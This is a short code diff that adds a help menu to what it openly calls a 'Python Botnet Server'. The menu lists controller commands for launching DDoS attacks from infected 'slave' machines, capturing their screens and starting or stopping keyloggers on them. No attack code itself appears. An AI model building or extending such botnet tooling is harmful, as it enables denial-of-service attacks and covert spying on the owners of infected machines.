@@ -122,6 +122,19 @@ if __name__ == "__main__":
             for slave in slaves:
                 message += "\n" + str(slave)
             print(message)
+        elif currentSplit[0] == "help":
+            print('''
+                  ###############################
+                   Python Botnet Server Commands
+                  ###############################
+                  ddos {target ip}: starts a ddos process on all connected slaves that targets the target ip
+                  screenshot {slave ip}: takes and shows a screenshot of the slave ip screen
+                  startkeylogger {slave ip}: starts a keylogger on the slave ip
+                  stopkeylogger {slave ip}: stops a keylogger on the slave ip
+                  slaves: shows currently connected slaves
+                  exit: stops the server
+                  help: shows this message
+                  ''')
         else:
             print("Unvalid command")
     p.terminate()
